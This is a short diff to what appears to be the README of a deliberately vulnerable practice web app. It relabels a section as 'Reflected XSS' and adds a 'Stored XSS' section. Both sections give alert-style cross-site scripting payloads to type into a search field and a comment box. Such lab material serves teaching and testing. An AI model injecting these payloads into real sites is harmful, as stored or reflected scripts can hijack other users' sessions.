@@ -63,7 +63,7 @@ CREATE TABLE economists (id INT AUTO_INCREMENT PRIMARY KEY,name VARCHAR(255),ima
 ```
 
 
-## XSS
+## Reflected XSS
 
 ### Insert this HTML command to keyword search field
 
@@ -71,5 +71,10 @@ CREATE TABLE economists (id INT AUTO_INCREMENT PRIMARY KEY,name VARCHAR(255),ima
 <img src=1 onerror="alert('hacked')"/>
 ```
 
+## Stored XSS
 
+### Insert this HTML command to comment
 
+```html
+<script>alert('hacked')</script>
+```
